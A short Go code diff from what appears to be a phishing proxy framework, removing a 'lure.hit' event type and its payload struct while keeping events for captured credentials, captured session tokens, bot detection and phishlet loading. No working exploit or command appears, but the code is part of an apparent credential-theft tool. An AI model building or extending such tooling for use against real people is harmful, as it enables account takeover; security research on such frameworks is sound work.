@@ -10,7 +10,6 @@ const (
 	EventCredsCaptured    EventType = "session.creds_captured"
 	EventTokensCaptured   EventType = "session.tokens_captured"
 	EventSessionCompleted EventType = "session.completed"
-	EventLureHit          EventType = "lure.hit"
 	EventBotDetected      EventType = "botguard.detected"
 	EventPhishletEnabled  EventType = "phishlet.enabled"
 	EventPhishletReloaded EventType = "phishlet.reloaded"
@@ -47,14 +46,6 @@ func SubscribeFunc(bus eventBus, eventType EventType, fn func(Event)) <-chan Eve
 		}
 	}()
 	return ch
-}
-
-// LureHitPayload is the payload for EventLureHit.
-type LureHitPayload struct {
-	LureID     string
-	Phishlet   string
-	RemoteAddr string
-	UserAgent  string
 }
 
 // BotDetectedPayload is the payload for EventBotDetected.
